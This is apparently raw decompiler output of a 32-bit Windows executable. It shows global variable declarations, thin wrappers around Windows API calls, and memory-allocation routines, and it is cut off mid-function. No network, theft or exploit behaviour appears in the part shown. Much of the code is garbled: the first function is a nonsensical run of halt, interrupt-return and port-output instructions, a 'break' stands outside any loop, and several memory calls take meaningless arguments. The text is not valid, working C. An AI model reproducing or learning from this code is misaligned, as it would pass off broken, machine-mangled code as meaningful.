int32_t g37; // 0x408148
int32_t g38; // 0x408154
int32_t g40 = 0; // 0x409000
int32_t g41 = 0; // 0x40900c
int32_t g42 = 0; // 0x409010
int32_t g43 = 0; // 0x409014
int32_t g44 = 0; // 0x40901c
int32_t g45 = 0; // 0x409020
int32_t g46 = 0; // 0x409024
int32_t g47 = 0; // 0x409028
int32_t g48 = 0; // 0x40902c
int32_t g49 = 0; // 0x409030
char g50 = 0; // 0x409034
char g51 = 0; // 0x409035
int32_t g52 = 0; // 0x409036
int32_t g53 = 0; // 0x409038
int32_t g54 = 0; // 0x40903c
int16_t g55 = 0; // 0x409208
int32_t g56 = 0; // 0x4093d4
int32_t g57 = 0; // 0x40959c
int32_t g58 = 0; // 0x4095a0
int32_t g59 = 0; // 0x4095a4
int32_t g60 = 0; // 0x4095a8
char g61 = 0; // 0x4095ac
int32_t g62 = 0; // 0x4095b0
struct _RTL_CRITICAL_SECTION * g63 = NULL; // 0x4095b4
int32_t g64 = 0; // 0x4095cc
int32_t g65 = 0; // 0x4095d0
int32_t g66 = 0; // 0x4095d4
int32_t g67 = 0; // 0x4095e4
int32_t g68 = 0; // 0x4095f4
int32_t g69 = 0; // 0x4095f8
int32_t g70 = 0; // 0x409600
int32_t g71 = 0; // 0x409604
int32_t g72 = 0; // 0x409608
int32_t g73 = 0; // 0x40960c
int32_t g74 = 0; // 0x409610
char * g75; // 0x409620
int32_t g76 = 0; // 0x409624
int32_t g77 = 0; // 0x409628
int32_t g78 = 0; // 0x40962c
int32_t g79 = 0; // 0x409630
char g80 = 0; // 0x409648
char g81 = 0; // 0x40964c
int32_t (*g82)(int32_t, int32_t, int32_t) = NULL; // 0x409650
int32_t g83 = 0; // 0x409654
int32_t g84 = 0; // 0x409658
int32_t g85 = 0; // 0x40965c
int32_t g86 = 0; // 0x409660
int32_t g87 = 0; // 0x409664
int32_t g88 = 0; // 0x409678
int32_t g89 = 0; // 0x40967c
int32_t g90 = 0; // 0x409680
int32_t g91 = 0; // 0x409684
int32_t g92 = 0; // 0x409688
int32_t g93 = 0; // 0x40968c
int32_t g94 = 0; // 0x409690
int32_t g95 = 0; // 0x409694
int32_t g96 = 0; // 0x409698
int32_t g97 = 0; // 0x40969c
int32_t g98 = 0; // 0x4096a0
int32_t g99 = 0; // 0x4096a4
int32_t g100 = 0; // 0x4096a8
int32_t g101 = 0; // 0x4096ac
int32_t g102 = 0; // 0x4096b0
int32_t g103 = 0; // 0x4096b4
int32_t g104 = 0; // 0x4096bc
int32_t g105 = 0; // 0x4096c0
int32_t g106 = 0; // 0x4096c8
int32_t g107 = 0; // 0x4096cc
int32_t g108 = 0; // 0x4096d4
int32_t g109 = 0; // 0x4096d8
int32_t g110 = 0; // 0x4096dc
int32_t g111 = 0; // 0x4096e0
int32_t g112 = 0; // 0x4096e4
int32_t g113 = 0; // 0x4096e8
int32_t g114 = 0; // 0x4096ec
int32_t g115 = 0; // 0x4096f0
int32_t g116 = 0; // 0x4096f4
int32_t g117 = 0; // 0x409808
int32_t g118;
int32_t * g39 = &g27; // 0x408160

// ------------------------ Functions -------------------------

// Address range: 0x401000 - 0x40110d
int32_t function_401000(void) {
    int64_t * v1 = (int64_t *)(__asm_hlt() - 12); // 0x401008
    int64_t v2; // 0x401000
    __asm_movq(*v1, __asm_punpckldq(v2, *v1));
    uint32_t v3; // 0x401000
    int32_t v4 = v3 - 1; // 0x401010
    char v5 = llvm_ctpop_i8((char)v4); // 0x401010
    int32_t v6 = __asm_hlt();
    int32_t v7; // 0x401000
    int32_t v8; // 0x401000
    if ((v5 & 1) == 0) {
        char v9 = v7;
        *(char *)v7 = -v9;
        __asm_hlt();
        __asm_arpl(*(int16_t *)(__asm_hlt() + 72), (int16_t)v8);
        __asm_hlt();
        if (v9 == 0 && v6 != 1) {
            unknown_400ff9();
        }
        // 0x40106a
        return __asm_hlt();
    }
    if (v3 <= 1) {
        unknown_400fb7();
    }
    // 0x401016
    int32_t v10; // 0x401000
    int32_t v11 = 72 * *(int32_t *)(v10 + 0x218ff448); // 0x401000
    __asm_hlt();
    int32_t v12 = __asm_hlt(); // 0x40101b
    __asm_hlt();
    __asm_wait();
    int32_t v13 = __asm_hlt();
    bool v14; // 0x401000
    int32_t v15; // 0x401000
    int32_t v16; // 0x401000
    int32_t v17; // 0x401000
    int32_t v18; // 0x401000
    int32_t v19; // 0x401000
    int32_t v20; // 0x401000
    if (v12 > 1) {
        unsigned char v21 = (char)v8; // 0x40101c
        unsigned char v22 = *(char *)(v7 + 0x3513f448) + v21; // 0x40101c
        v17 = 0x48f4487c;
        v14 = v22 < v21;
        v15 = v8 & -256 | (int32_t)v22;
        goto lab_0x401077;
    } else {
        int32_t v23 = v12 - 1; // 0x401022
        int64_t v24 = (int64_t)*(int32_t *)(v13 - 12); // 0x401029
        int64_t v25 = -85 * v24; // 0x401029
        int32_t v26 = v25; // 0x401029
        v14 = v25 != -0x5500000000 * v24 / 0x100000000;
        v15 = v26;
        if (v23 < 0 == (v25 != -0x5500000000 * v24 / 0x100000000) == (v23 != 0)) {
            goto lab_0x401077;
        } else {
            // 0x40102f
            __asm_hlt();
            int32_t v27 = v11 | 4; // 0x401030
            v18 = *(int32_t *)v11;
            v16 = v26;
            v20 = v27;
            if (v25 == -0x5500000000 * v24 / 0x100000000) {
                goto lab_0x40107b;
            } else {
                // 0x401033
                __asm_hlt();
                __asm_hlt();
                char * v28 = (char *)(__asm_hlt() - 12); // 0x40103d
                *v28 = *v28 | -95;
                int32_t v29 = v27 - 6; // 0x401041
                *(int32_t *)v29 = 72;
                __asm_hlt();
                v19 = v29;
                goto lab_0x401044;
            }
        }
    }
  lab_0x401077:
    // 0x401077
    __asm_hlt();
    v18 = v17;
    v16 = v15;
    v20 = v11;
    uint32_t v30; // 0x401000
    if (!v14) {
        char * v31 = (char *)(v30 - 0x6fda0040); // 0x4010f4
        *v31 = *v31 + (char)v15;
        return *(int32_t *)-0x3f74ffc0;
    }
    goto lab_0x40107b;
  lab_0x40107b:;
    int32_t v32 = v20;
    int32_t v33 = __asm_hlt(); // 0x40107b
    __asm_hlt();
    v19 = v32;
    if (v16 < 2) {
        goto lab_0x401044;
      lab_0x401044:
        // 0x401044
        *(int32_t *)(v19 - 4) = v4;
        __asm_iretd();
        __asm_hlt();
        return __asm_hlt();
    }
    int32_t v34 = __asm_hlt(); // 0x401083
    char v35 = v34; // 0x401084
    __asm_out(105, v35);
    int32_t v36 = *(int32_t *)(v34 - 1); // 0x401087
    char * v37 = (char *)v36; // 0x40108a
    char v38 = v33; // 0x40108a
    char v39 = *v37 + v38; // 0x40108a
    *v37 = v39;
    if (v39 == 0) {
        // 0x401107
        return WriteFile2();
    }
    char * v40 = (char *)v34; // 0x401097
    *v40 = *v40 + 14 * v35;
    float80_t v41; // 0x401000
    *(int16_t *)v34 = (int16_t)v41;
    int32_t v42 = v34 + 1; // 0x4010b5
    char * v43 = (char *)(2 * v42); // 0x4010b6
    char v44 = v42; // 0x4010b6
    *v43 = *v43 + v44;
    char * v45 = (char *)v42; // 0x4010b9
    *v45 = *v45 + 3 * v44;
    char * v46 = (char *)(v18 + 43); // 0x4010c2
    *v46 = v35 + 2 + *v46;
    char * v47 = (char *)(v30 + 43); // 0x4010c6
    *v47 = *v47 + v38;
    *v46 = *v46 + v38;
    *v47 = v35 + 5 + *v47;
    int32_t v48 = v34 + 6; // 0x4010d1
    char * v49 = (char *)v18; // 0x4010d2
    char v50 = *v49 + (char)(v30 / 256); // 0x4010d2
    *v49 = v50;
    unsigned char v51 = (char)v48 - *(char *)v48; // 0x4010d4
    unsigned char v52 = *(char *)(v48 & -256 | (int32_t)v51); // 0x4010d8
    char v53 = v51 - v52; // 0x4010d8
    if (v51 < v52 || v53 == 0) {
        // 0x4010dd
        *v49 = v50 + 1 + v53;
        *(int32_t *)(v32 - 6) = v32 - 2;
        __asm_bound(*(int64_t *)(v36 + 101));
        __asm_arpl(*(int16_t *)(9 * v18 + 28), (int16_t)v10 + 1);
        return *(int32_t *)-0x3f74ffc0;
    }
    // 0x401107
    return WriteFile2();
}

// Address range: 0x40110f - 0x401115
int32_t function_40110f(void) {
    // 0x40110f
    return ExitProcess2();
}

// Address range: 0x401117 - 0x40111d
int32_t function_401117(int32_t * hWnd, char * lpText, char * lpCaption, int32_t uType) {
    // 0x401117
    return MessageBoxA(hWnd, lpText, lpCaption, uType);
}

// Address range: 0x40111f - 0x401125
bool function_40111f(int32_t * hLibModule) {
    // 0x40111f
    return FreeLibrary(hLibModule);
}

// Address range: 0x401127 - 0x40112d
char * function_401127(void) {
    // 0x401127
    return GetCommandLineA();
}

// Address range: 0x40112f - 0x401135
int32_t function_40112f(int32_t Locale, int32_t LCType, char * lpLCData, int32_t cchData) {
    // 0x40112f
    return GetLocaleInfoA(Locale, LCType, lpLCData, cchData);
}

// Address range: 0x401137 - 0x40113d
void function_401137(struct _STARTUPINFOA * lpStartupInfo) {
    // 0x401137
    GetStartupInfoA(lpStartupInfo);
}

// Address range: 0x40113f - 0x401145
int32_t function_40113f(void) {
    // 0x40113f
    return GetThreadLocale();
}

// Address range: 0x401147 - 0x40114d
int32_t function_401147(int32_t a1) {
    // 0x401147
    return RegCloseKey2();
}

// Address range: 0x40114f - 0x401155
int32_t function_40114f(int32_t a1, int32_t a2, int32_t * a3, int32_t a4, int32_t a5, char * a6, int32_t a7) {
    // 0x40114f
    return RegOpenKeyExA2();
}

// Address range: 0x401157 - 0x40115d
int32_t function_401157(int32_t a1) {
    // 0x401157
    return RegQueryValueExA2();
}

// Address range: 0x40115f - 0x401165
int32_t function_40115f(int16_t ** pbstr, int16_t * psz, int32_t len) {
    // 0x40115f
    return SysReAllocStringLen(pbstr, psz, len);
}

// Address range: 0x401167 - 0x40116d
void function_401167(int16_t * bstrString) {
    // 0x401167
    SysFreeString(bstrString);
}

// Address range: 0x40116f - 0x401175
int32_t function_40116f(void) {
    // 0x40116f
    return GetCurrentThreadId();
}

// Address range: 0x401177 - 0x40117d
int32_t function_401177(void) {
    // 0x401177
    return GetVersion();
}

// Address range: 0x40117f - 0x401185
bool function_40117f(struct _LARGE_INTEGER * lpPerformanceCount) {
    // 0x40117f
    return QueryPerformanceCounter(lpPerformanceCount);
}

// Address range: 0x401187 - 0x40118d
int32_t function_401187(void) {
    // 0x401187
    return GetTickCount2();
}

// Address range: 0x40118f - 0x4011b1
int32_t function_40118f(void) {
    // 0x40118f
    int32_t lpStartupInfo; // 0x40118f
    GetStartupInfoA((struct _STARTUPINFOA *)lpStartupInfo);
    uint16_t v1; // 0x40118f
    char v2; // 0x40118f
    return (v2 & 1) == 0 ? 10 : (int32_t)v1;
}

// Address range: 0x4011b3 - 0x4011b9
int32_t function_4011b3(void) {
    // 0x4011b3
    return LocalAlloc2();
}

// Address range: 0x4011bb - 0x4011c1
int32_t function_4011bb(void) {
    // 0x4011bb
    return LocalFree2();
}

// Address range: 0x4011c3 - 0x4011c9
int32_t * function_4011c3(int32_t * lpAddress, int32_t dwSize, int32_t flAllocationType, int32_t flProtect) {
    // 0x4011c3
    return VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);
}

// Address range: 0x4011cb - 0x4011d1
bool function_4011cb(int32_t * lpAddress, int32_t dwSize, int32_t dwFreeType) {
    // 0x4011cb
    return VirtualFree(lpAddress, dwSize, dwFreeType);
}

// Address range: 0x4011d3 - 0x4011d9
void function_4011d3(struct _RTL_CRITICAL_SECTION * lpCriticalSection) {
    // 0x4011d3
    InitializeCriticalSection(lpCriticalSection);
}

// Address range: 0x4011db - 0x4011e1
void function_4011db(struct _RTL_CRITICAL_SECTION * lpCriticalSection) {
    // 0x4011db
    EnterCriticalSection(lpCriticalSection);
}

// Address range: 0x4011e3 - 0x4011e9
void function_4011e3(struct _RTL_CRITICAL_SECTION * lpCriticalSection) {
    // 0x4011e3
    LeaveCriticalSection(lpCriticalSection);
}

// Address range: 0x4011eb - 0x4011f1
void function_4011eb(struct _RTL_CRITICAL_SECTION * lpCriticalSection) {
    // 0x4011eb
    DeleteCriticalSection(lpCriticalSection);
}

// Address range: 0x4011f3 - 0x401242
int32_t function_4011f3(int32_t a1, int32_t a2) {
    int32_t result = g65; // 0x4011fa
    if (result != 0) {
        // 0x401239
        g65 = *(int32_t *)result;
        return result;
    }
    int32_t v1 = function_4011b3(); // 0x401206
    if (v1 == 0) {
        // 0x401211
        return 0;
    }
    // 0x401216
    *(int32_t *)v1 = g64;
    g64 = v1;
    int32_t v2 = 0; // 0x401223
    int32_t result2 = v1 + 4 + 16 * v2; // 0x401229
    int32_t * v3 = (int32_t *)result2;
    *v3 = g65;
    g65 = result2;
    v2++;
    while (v2 != 100) {
        int32_t v4 = result2; // 0x40122d
        result2 = v1 + 4 + 16 * v2;
        v3 = (int32_t *)result2;
        *v3 = v4;
        g65 = result2;
        v2++;
    }
    // 0x401239
    g65 = *v3;
    return result2;
}

// Address range: 0x401243 - 0x401249
int32_t function_401243(void) {
    // 0x401243
    int32_t result; // 0x401243
    return result;
}

// Address range: 0x40124b - 0x40127b
int32_t function_40124b(void) {
    // 0x40124b
    int32_t v1; // 0x40124b
    int32_t v2; // 0x40124b
    int32_t v3 = function_4011f3(v2, v1); // 0x401251
    if (v3 == 0) {
        // 0x40125a
        return 0;
    }
    // 0x40125f
    int32_t v4; // 0x40124b
    *(int32_t *)(v3 + 12) = *(int32_t *)(v4 + 4);
    *(int32_t *)v3 = v3;
    *(int32_t *)(v3 + 4) = v3;
    int32_t v5; // 0x40124b
    *(int32_t *)v5 = v3;
    return v3 & -256 | 1;
}

// Address range: 0x40127b - 0x401293
int32_t function_40127b(void) {
    // 0x40127b
    int32_t result; // 0x40127b
    int32_t * v1 = (int32_t *)(result + 4); // 0x40127b
    *(int32_t *)result = g65;
    return result;
}

// Address range: 0x401293 - 0x401303
int32_t function_401293(void) {
    // 0x401293
    int32_t v1; // 0x401293
    int32_t * v2 = (int32_t *)v1; // 0x4012a7
    int32_t v3; // 0x401293
    int32_t v4 = *(int32_t *)(v3 + 4); // 0x4012a9
    int32_t * v5 = (int32_t *)(v1 + 4); // 0x4012ac
    *v5 = v4;
    int32_t v6; // 0x401293
    int32_t v7 = *(int32_t *)v6; // 0x4012af
    int32_t * v8 = (int32_t *)(v6 + 8); // 0x4012b3
    int32_t v9 = *v8; // 0x4012b3
    int32_t * v10 = (int32_t *)(v6 + 12); // 0x4012b6
    int32_t v11; // 0x401293
    int32_t v12; // 0x4012cc
    int32_t v13; // 0x4012e3
    if (v1 != *v10 + v9) {
        // 0x4012d1
        v11 = v4;
        if (v4 + v1 == v9) {
            // 0x4012d9
            function_40127b();
            v13 = *v5 + *v10;
            *v5 = v13;
            v11 = v13;
        }
    } else {
        // 0x4012bd
        function_40127b();
        *v2 = *v8;
        v12 = *v5 + *v10;
        *v5 = v12;
        v11 = v12;
    }
    int32_t v14 = v11; // 0x4012ea
    v6 = v7;
    int32_t v15; // 0x401293
    while (v15 != v7) {
        // 0x4012af
        v7 = *(int32_t *)v6;
        v8 = (int32_t *)(v6 + 8);
        v9 = *v8;
        v10 = (int32_t *)(v6 + 12);
        if (v1 != *v10 + v9) {
            // 0x4012d1
            v11 = v14;
            if (v14 + v1 == v9) {
                // 0x4012d9
                function_40127b();
                v13 = *v5 + *v10;
                *v5 = v13;
                v11 = v13;
            }
        } else {
            // 0x4012bd
            function_40127b();
            *v2 = *v8;
            v12 = *v5 + *v10;
            *v5 = v12;
            v11 = v12;
        }
        // 0x4012e6
        v14 = v11;
        v6 = v7;
    }
    int32_t v16 = function_40124b(); // 0x4012f0
    int32_t result = v16; // 0x4012f7
    if ((char)v16 == 0) {
        // 0x4012f9
        *v2 = 0;
        result = 0;
    }
    // 0x4012fd
    return result;
}

// Address range: 0x401303 - 0x401396
int32_t function_401303(void) {
    // 0x401303
    uint32_t v1; // 0x401303
    int32_t * v2 = (int32_t *)(v1 + 4);
    int32_t v3; // 0x401303
    int32_t * v4 = (int32_t *)(v3 + 8);
    uint32_t v5 = *v4; // 0x401310
    int32_t result; // 0x401303
    int32_t v6; // 0x40131e
    uint32_t v7; // 0x40131e
    int32_t v8; // 0x40132f
    int32_t v9; // 0x401332
    int32_t v10; // 0x401376
    int32_t v11; // 0x401319
    uint32_t v12; // 0x401319
    int32_t * v13; // 0x401303
    if (v1 >= v5) {
        // 0x401317
        v11 = *v2;
        v12 = v11 + v1;
        v13 = (int32_t *)(v3 + 12);
        v6 = *v13;
        v7 = v6 + v5;
        if (v12 <= v7) {
            if (v1 != v5) {
                if (v12 != v7) {
                    // 0x401359
                    *v13 = v1 - v5;
                    v10 = function_40124b();
                    result = 0;
                    if ((char)v10 != 0) {
                        // 0x401383
                        result = v10 & -256 | 1;
                        return result;
                    } else {
                        return result;
                    }
                } else {
                    // 0x401354
                    *v13 = v6 - v11;
                    // 0x401383
                    result = v5 & -256 | 1;
                    return result;
                }
            } else {
                // 0x401329
                *v4 = v11 + v5;
                v8 = *v2;
                v9 = *v13 - v8;
                *v13 = v9;
                if (v9 != 0) {
                    // 0x401383
                    result = v8 & -256 | 1;
                    return result;
                } else {
                    // 0x401383
                    result = function_40127b() & -256 | 1;
                    return result;
                }
            }
        }
    }
    int32_t v14 = *(int32_t *)v3; // 0x401387
    result = 0;
    int32_t v15; // 0x401303
    while (v15 != v14) {
        int32_t v16 = v14;
        v4 = (int32_t *)(v16 + 8);
        v5 = *v4;
        if (v1 >= v5) {
            // 0x401317
            v11 = *v2;
            v12 = v11 + v1;
            v13 = (int32_t *)(v16 + 12);
            v6 = *v13;
            v7 = v6 + v5;
            if (v12 <= v7) {
                if (v1 != v5) {
                    if (v12 != v7) {
                        // 0x401359
                        *v13 = v1 - v5;
                        v10 = function_40124b();
                        result = 0;
                        if ((char)v10 != 0) {
                            // 0x401383
                            result = v10 & -256 | 1;
                            return result;
                        } else {
                            return result;
                        }
                    } else {
                        // 0x401354
                        *v13 = v6 - v11;
                        // 0x401383
                        result = v5 & -256 | 1;
                        return result;
                    }
                } else {
                    // 0x401329
                    *v4 = v11 + v5;
                    v8 = *v2;
                    v9 = *v13 - v8;
                    *v13 = v9;
                    if (v9 != 0) {
                        // 0x401383
                        result = v8 & -256 | 1;
                        return result;
                    } else {
                        // 0x401383
                        result = function_40127b() & -256 | 1;
                        return result;
                    }
                }
            }
        }
        // 0x401387
        v14 = *(int32_t *)v16;
        result = 0;
    }
  lab_0x40138f:
    // 0x40138f
    return result;
}

// Address range: 0x401397 - 0x4013fa
int32_t function_401397(void) {
    // 0x401397
    int32_t dwFreeType; // 0x401397
    int32_t v1; // 0x401397
    *(int32_t *)(dwFreeType + 4) = v1 > 0xfffff ? v1 + 0xffff & -0x10000 : 0x100000;
    int32_t flAllocationType; // 0x401397
    int32_t dwSize; // 0x401397
    int32_t lpAddress; // 0x401397
    int32_t * memory = VirtualAlloc((int32_t *)lpAddress, dwSize, flAllocationType, 1); // 0x4013c6
    int32_t result = (int32_t)memory; // 0x4013c6
    int32_t * v2 = (int32_t *)dwFreeType; // 0x4013cd
    *v2 = result;
    if (memory == NULL) {
        // 0x4013f6
        return result;
    }
    int32_t v3 = function_40124b(); // 0x4013da
    int32_t result2 = v3; // 0x4013e1
    if ((char)v3 == 0) {
        // 0x4013e3
        VirtualFree((int32_t *)0x8000, 0, dwFreeType);
        *v2 = 0;
        result2 = 0;
    }
    // 0x4013f6
    return result2;
}

// Address range: 0x4013fb - 0x401472
int32_t function_4013fb(void) {
    // 0x4013fb
    int32_t v1; // 0x4013fb
    int32_t * v2 = (int32_t *)(v1 + 4); // 0x401405
    *v2 = 0x100000;
    int32_t flAllocationType; // 0x4013fb
    int32_t dwSize; // 0x4013fb
    int32_t flProtect; // 0x4013fb
    int32_t lpAddress; // 0x4013fb
    int32_t * memory = VirtualAlloc((int32_t *)lpAddress, dwSize, flAllocationType, flProtect); // 0x401419
    int32_t v3 = (int32_t)memory; // 0x401419
    int32_t * v4 = (int32_t *)v1; // 0x401420
    *v4 = v3;
    int32_t memory2 = v3; // 0x401424
    int32_t v5; // bp-32, 0x4013fb
    int32_t * v6 = &v5; // 0x401424
    if (memory == NULL) {
        // 0x401426
        int32_t v7; // 0x4013fb
        int32_t flAllocationType2 = v7 + 0xffff & -0x10000; // 0x40142c
        *v2 = flAllocationType2;
        int32_t flProtect2; // 0x4013fb
        memory2 = (int32_t)VirtualAlloc((int32_t *)4, 0x2000, flAllocationType2, flProtect2);
        *v4 = memory2;
        int32_t v8; // bp-48, 0x4013fb
        v6 = &v8;
    }
    // 0x401445
    if (v1 == 0) {
        // 0x40146d
        return memory2;
    }
    int32_t v9 = function_40124b(); // 0x401451
    int32_t result = v9; // 0x401458
    if ((char)v9 == 0) {
        int32_t v10 = (int32_t)v6;
        *(int32_t *)(v10 - 4) = 0x8000;
        *(int32_t *)(v10 - 8) = 0;
        VirtualFree(&g118, (int32_t)&g118, (int32_t)&g118);
        *v4 = 0;
        result = 0;
    }
    // 0x40146d
    return result;
}

// Address range: 0x401473 - 0x40152b
int32_t function_401473(void) {
    // 0x401473
    int32_t v1; // bp-36, 0x401473
    int32_t v2 = &v1; // 0x401477
    int32_t v3 = v2; // 0x4014f9
    if (g66 != (int32_t)&g66) {
        int32_t v4 = *(int32_t *)g66; // 0x4014a2
        uint32_t v5 = *(int32_t *)(g66 + 8); // 0x4014a4
        int32_t v6 = v2; // 0x4014a9
        int32_t v7; // 0x401473
        uint32_t v8; // 0x401473
        uint32_t v9; // 0x401473
        int32_t * v10; // 0x4014ad
        int32_t v11; // 0x401473
        int32_t * v12; // 0x4014b6
        int32_t * v13; // 0x4014c5
        int32_t v14; // 0x4014d6
        if (v9 <= v5) {
            // 0x4014ab
            v10 = (int32_t *)(g66 + 12);
            v11 = *v10 + v5;
            v6 = v2;
            if (v11 <= *(int32_t *)(v2 + 16)) {
                // 0x4014b6
                v12 = (int32_t *)(v2 + 8);
                v7 = v11;
                if (v5 < *v12) {
                    // 0x4014bc
                    *v12 = v5;
                    v7 = *v10 + v5;
                }
                // 0x4014c0
                v8 = v7;
                v13 = (int32_t *)(v2 + 12);
                if (v8 > *v13) {
                    // 0x4014cb
                    *v13 = v8;
                }
                // 0x4014cf
                *(int32_t *)(v2 - 4) = 0x8000;
                *(int32_t *)(v2 - 8) = 0;
                v14 = v2 - 12;
                *(int32_t *)v14 = v5;
                if (!VirtualFree(&g118, (int32_t)&g118, (int32_t)&g118)) {
                    // 0x4014e0
                    g62 = 1;
                }
                // 0x4014ea
                function_40127b();
                v6 = v14;
            }
        }
        int32_t v15 = v6;
        v3 = v15;
        while (v4 != (int32_t)&g66) {
            int32_t v16 = v15;
            int32_t v17 = v4;
            v4 = *(int32_t *)v17;
            v5 = *(int32_t *)(v17 + 8);
            v6 = v16;
            if (v9 <= v5) {
                // 0x4014ab
                v10 = (int32_t *)(v17 + 12);
                v11 = *v10 + v5;
                v6 = v16;
                if (v11 <= *(int32_t *)(v16 + 16)) {
                    // 0x4014b6
                    v12 = (int32_t *)(v16 + 8);
                    v7 = v11;
                    if (v5 < *v12) {
                        // 0x4014bc
                        *v12 = v5;
                        v7 = *v10 + v5;
                    }
                    // 0x4014c0
                    v8 = v7;
                    v13 = (int32_t *)(v16 + 12);
                    if (v8 > *v13) {
                        // 0x4014cb
                        *v13 = v8;
                    }
                    // 0x4014cf
                    *(int32_t *)(v16 - 4) = 0x8000;
                    *(int32_t *)(v16 - 8) = 0;
                    v14 = v16 - 12;
                    *(int32_t *)v14 = v5;
                    if (!VirtualFree(&g118, (int32_t)&g118, (int32_t)&g118)) {
                        // 0x4014e0
                        g62 = 1;
                    }
                    // 0x4014ea
                    function_40127b();
                    v6 = v14;
                }
            }
            // 0x4014f1
            v15 = v6;
            v3 = v15;
        }
    }
    int32_t * v18 = (int32_t *)(v3 + 4); // 0x4014fb
    int32_t v19 = *v18; // 0x4014fb
    *(int32_t *)v19 = 0;
    int32_t * v20 = (int32_t *)(v3 + 12); // 0x401503
    int32_t result = v19; // 0x401508
    if (*v20 != 0) {
        int32_t * v21 = (int32_t *)(v3 + 8); // 0x40150e
        *(int32_t *)*v18 = *v21;
        result = *v20 - *v21;
        *(int32_t *)(*v18 + 4) = result;
    }
    // 0x401523
    return result;
}

// Address range: 0x40152b - 0x4015bd
int32_t function_40152b(void) {
    // 0x40152b
    int32_t v1; // 0x40152b
    uint32_t v2 = v1 & -0x1000; // 0x40153d
    int32_t v3; // 0x40152b
    *(int32_t *)v3 = v2;
    int32_t v4; // 0x40152b
    int32_t result = (v4 + 4095 + v1 & -0x1000) - v2; // 0x401560
    *(int32_t *)(v3 + 4) = result;
    if (g66 == (int32_t)&g66) {
        // 0x4015b5
        return result;
    }
    int32_t v5 = g66;
    int32_t v6; // bp-28, 0x40152b
    int32_t v7 = &v6;
    uint32_t v8 = *(int32_t *)(v5 + 8); // 0x401571
    uint32_t v9 = *(int32_t *)(v5 + 12) + v8; // 0x401577
    uint32_t v10 = v2 > v8 ? v2 : v8;
    uint32_t v11 = *(int32_t *)(v7 + 8); // 0x40157f
    uint32_t v12 = v9 > v11 ? v11 : v9;
    int32_t v13 = result; // 0x40158b
    int32_t v14 = v7; // 0x40158b
    int32_t * memory; // 0x401598
    if (v12 > v10) {
        // 0x40158d
        *(int32_t *)(v7 - 4) = 4;
        *(int32_t *)(v7 - 8) = 0x1000;
        *(int32_t *)(v7 - 12) = v12 - v10;
        v14 = v7 - 16;
        *(int32_t *)v14 = v10;
        memory = VirtualAlloc(&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118);
        v13 = (int32_t)memory;
        if (memory == NULL) {
            // break -> 0x4015a1
            break;
        }
    }
    int32_t v15 = v13;
    v5 = *(int32_t *)v5;
    int32_t result2 = v15; // 0x4015b3
    while (v5 != (int32_t)&g66) {
        // 0x401571
        v7 = v14;
        v8 = *(int32_t *)(v5 + 8);
        v9 = *(int32_t *)(v5 + 12) + v8;
        v10 = v2 > v8 ? v2 : v8;
        v11 = *(int32_t *)(v7 + 8);
        v12 = v9 > v11 ? v11 : v9;
        v13 = v15;
        v14 = v7;
        if (v12 > v10) {
            // 0x40158d
            *(int32_t *)(v7 - 4) = 4;
            *(int32_t *)(v7 - 8) = 0x1000;
            *(int32_t *)(v7 - 12) = v12 - v10;
            v14 = v7 - 16;
            *(int32_t *)v14 = v10;
            memory = VirtualAlloc(&g118, (int32_t)&g118, (int32_t)&g118, (int32_t)&g118);
            v13 = (int32_t)memory;
            if (memory == NULL) {
                // break -> 0x4015a1
                break;
            }
        }
        // 0x4015ab
        v15 = v13;
        v5 = *(int32_t *)v5;
        result2 = v15;
    }
    // 0x4015b5
    return result2;
}

// Address range: 0x4015bf - 0x40163c
int32_t function_4015bf(int32_t a1, int32_t a2, int32_t a3) {
    // 0x4015bf
    int32_t v1; // 0x4015bf
    int32_t v2 = v1 + 4095 & -0x1000; // 0x4015ce
    int32_t v3 = v2; // bp-20, 0x4015d4
    int32_t v4; // 0x4015bf
    uint32_t v5 = v1 + v4 & -0x1000; // 0x4015db
    int32_t v6; // 0x4015bf
    *(int32_t *)v6 = v2;
    int32_t result = v5 - v3; // 0x4015e8
    *(int32_t *)(v6 + 4) = result;
    if (g66 == (int32_t)&g66) {
        // 0x401636
        return result;
    }
    int32_t v7 = g66;
    int32_t v8 = &v3;
    uint32_t v9 = *(int32_t *)(v7 + 8); // 0x4015f6
    uint32_t v10 = *(int32_t *)(v7 + 12) + v9; // 0x4015fc
    uint32_t v11 = *(int32_t *)v8; // 0x4015fe
    uint32_t v12 = v9 >= v11 ? v9 : v11;
    uint32_t v13 = v5 >= v10 ? v10 : v5;
    int32_t v14 = result; // 0x40160e
    int32_t v15 = v8; // 0x40160e
    int32_t v16; // 0x401618
    bool v17; // 0x401619
    int32_t v18; // 0x401619
    if (v13 > v12) {
        // 0x401610
        *(int32_t *)(v8 - 4) = 0x4000;
        *(int32_t *)(v8 - 8) = v13 - v12;
        v16 = v8 - 12;
        *(int32_t *)v16 = v12;
        v17 = VirtualFree(&g118, (int32_t)&g118, (int32_t)&g118);
        v18 = v17;
        v14 = v18;
        v15 = v16;
        if (!v17) {
            // 0x401622
            g62 = 2;
            v14 = v18;
            v15 = v16;
        }
    }
    int32_t result2 = v14;
    v7 = *(int32_t *)v7;
    while (v7 != (int32_t)&g66) {
        // 0x4015f6
        v8 = v15;
        v9 = *(int32_t *)(v7 + 8);
        v10 = *(int32_t *)(v7 + 12) + v9;
        v11 = *(int32_t *)v8;
        v12 = v9 >= v11 ? v9 : v11;
        v13 = v5 >= v10 ? v10 : v5;
        v14 = result2;
        v15 = v8;
        if (v13 > v12) {
            // 0x401610
            *(int32_t *)(v8 - 4) = 0x4000;
            *(int32_t *)(v8 - 8) = v13 - v12;
            v16 = v8 - 12;
            *(int32_t *)v16 = v12;
            v17 = VirtualFree(&g118, (int32_t)&g118, (int32_t)&g118);
            v18 = v17;
            v14 = v18;
            v15 = v16;
            if (!v17) {
                // 0x401622
                g62 = 2;
                v14 = v18;
                v15 = v16;
            }
        }
        // 0x40162c
        result2 = v14;
        v7 = *(int32_t *)v7;
    }
    // 0x401636
    return result2;
}

// Address range: 0x40163f - 0x4016cd
int32_t function_40163f(int32_t a1) {
    // 0x40163f
    int32_t v1; // 0x40163f
    uint32_t v2 = v1 + 0x3fff & -0x4000; // 0x401655
    int32_t v3; // 0x40163f
    int32_t v4; // 0x40163f
    int32_t * v5; // 0x40163f
    if (g67 != (int32_t)&g67) {
        v4 = g67;
        v5 = (int32_t *)(v4 + 12);
        if (v2 <= *v5) {
            // break (via goto) -> 0x401665
            goto lab_0x401665;
        }
        // 0x401691
        v3 = *(int32_t *)v4;
        while (v3 != (int32_t)&g67) {
            // 0x401660
